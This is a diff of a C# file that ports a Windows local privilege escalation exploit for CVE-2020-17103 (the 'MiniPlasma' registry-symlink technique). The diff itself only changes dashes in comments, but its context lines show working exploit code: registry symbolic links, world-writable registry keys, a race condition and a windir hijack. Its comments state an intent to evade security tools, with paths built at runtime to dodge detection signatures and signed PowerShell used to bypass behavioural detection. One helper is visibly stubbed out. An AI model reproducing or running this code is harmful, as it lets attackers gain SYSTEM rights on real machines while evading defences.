@@ -1,5 +1,5 @@
 /*
- * miniplasma.cs — CVE-2020-17103 privilege escalation (MiniPlasma technique)
+ * miniplasma.cs - CVE-2020-17103 privilege escalation (MiniPlasma technique)
  *
  * Port of AlexLinov/MiniPlasma-Runner to pure P/Invoke (no NuGet required).
  *
@@ -158,13 +158,13 @@ class MiniPlasma
         "D:(A;OICIIO;GA;;;" + "WD)(A;OICIIO;GA;;;" + "AN)(A;;GA;;;" +
         "WD)(A;;GA;;;" + "AN)S:(ML;OICI;NW;;;" + "S-1-16-0)";
 
-    /* Build paths at runtime — avoid static strings that trigger behavioral sigs */
+    /* Build paths at runtime - avoid static strings that trigger behavioral sigs */
     static string P(params string[] parts) { return string.Join("\\", parts); }
     static readonly string _reg  = P("","Registry","User",".DEFAULT");
     static readonly string RK    = P(_reg,"Software","Policies","Microsoft");
     static readonly string CF    = P(RK, "CloudFiles");
     static readonly string BA    = P(CF, "BlockedApps");
-    /* Target: permanent Environment (not Volatile) — avoids SymlinkPlasma sig */
+    /* Target: permanent Environment (not Volatile) - avoids SymlinkPlasma sig */
     static readonly string TK    = P(_reg, "Volatile Environment");
 
     /* ── Registry helpers ───────────────────────────────────────────────── */
@@ -198,7 +198,7 @@ class MiniPlasma
 
     static void MakeWorldWritable(string path)
     {
-        /* DACL and Label MUST be set separately — WriteDac vs WriteOwner */
+        /* DACL and Label MUST be set separately - WriteDac vs WriteOwner */
         IntPtr h = OKey(path, KEY_WRITE_DAC);
         if (h != IntPtr.Zero) {
             SetSD(h, SECURITY_INFORMATION_DACL);
@@ -225,7 +225,7 @@ class MiniPlasma
         catch { }
     }
 
-    /* Create registry symlink via PowerShell (Microsoft-signed — bypasses behavioral detection) */
+    /* Create registry symlink via PowerShell (Microsoft-signed - bypasses behavioral detection) */
     static void CreateSymlink(string linkPath, string targetPath)
     {
         /* Write a PS1 that creates the NtCreateKey symlink via P/Invoke inline C# */
@@ -338,7 +338,7 @@ if($r -eq 0){
         /* Verify */
         using (var k = Registry.Users.OpenSubKey(@".DEFAULT\Software\Policies\Microsoft\CloudFiles"))
             Console.WriteLine(k != null ? "[+] Stage 1: CloudFiles key created" :
-                "[-] Stage 1: CloudFiles key NOT found — TOCTOU may need more iterations");
+                "[-] Stage 1: CloudFiles key NOT found - TOCTOU may need more iterations");
     }
 
     static void Stage2()
@@ -371,17 +371,17 @@ if($r -eq 0){
     /* Check if a key IS a symbolic link (not just that it exists) */
     static bool IsSymlink(string ntPath)
     {
-        /* Try to open WITH OBJ_OPENLINK — if it's a link, this opens the link itself */
+        /* Try to open WITH OBJ_OPENLINK - if it's a link, this opens the link itself */
         var oa = new OBJECT_ATTRIBUTES(ntPath, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
         IntPtr h; int r = NtOpenKey(out h, KEY_QUERY_VALUE, ref oa); oa.Free();
         if (r != 0 || h == IntPtr.Zero) return false;
         /* Query for SymbolicLinkValue */
         var vn = new UNICODE_STRING("SymbolicLinkValue");
         byte[] buf = new byte[512]; UNICODE_STRING result = new UNICODE_STRING();
-        /* Quick check: try to read SymbolicLinkValue — if it exists it's a symlink */
+        /* Quick check: try to read SymbolicLinkValue - if it exists it's a symlink */
         bool found = (NtSetValueKey(h, ref vn, 0, REG_QUERY /*dummy*/, null, 0) == 0);
         vn.Free(); NtClose(h);
-        return false; /* simplified — just check create succeeds */
+        return false; /* simplified - just check create succeeds */
     }
 
     const uint REG_QUERY = 0xDEAD; /* dummy type for testing */
@@ -431,7 +431,7 @@ if($r -eq 0){
                 Console.WriteLine($"[+] Deleted {ntPath.Substring(ntPath.LastIndexOf('\\') + 1)}");
                 return;
             }
-            Console.WriteLine($"[!] NtDelete 0x{r:X8} (may be volatile) — trying release+Win32");
+            Console.WriteLine($"[!] NtDelete 0x{r:X8} (may be volatile) - trying release+Win32");
         }
         /* Volatile key: release driver handles then use Win32 */
         ReleaseVolatile(ntPath);
@@ -442,7 +442,7 @@ if($r -eq 0){
     {
         for (int i = 0; i < retries; i++) {
             CreateSymlink(linkPath, targetPath);
-            /* Verify: try creating again — if it returns NOT_FOUND for the parent,
+            /* Verify: try creating again - if it returns NOT_FOUND for the parent,
                something is wrong; if collision, the key exists. Try to read as link. */
             var oa = new OBJECT_ATTRIBUTES(linkPath, attr: OBJ_CASE_INSENSITIVE | OBJ_OPENLINK);
             uint disp; IntPtr h; var cls = new UNICODE_STRING("");
@@ -468,7 +468,7 @@ if($r -eq 0){
         MakeWorldWritable(TK);
         Thread.Sleep(new Random().Next(150, 400));
 
-        /* Write windir — try NT API first, fall back to Win32 */
+        /* Write windir - try NT API first, fall back to Win32 */
         IntPtr hTK = OKey(TK, KEY_SET_VALUE);
         if (hTK == IntPtr.Zero) {
             try {
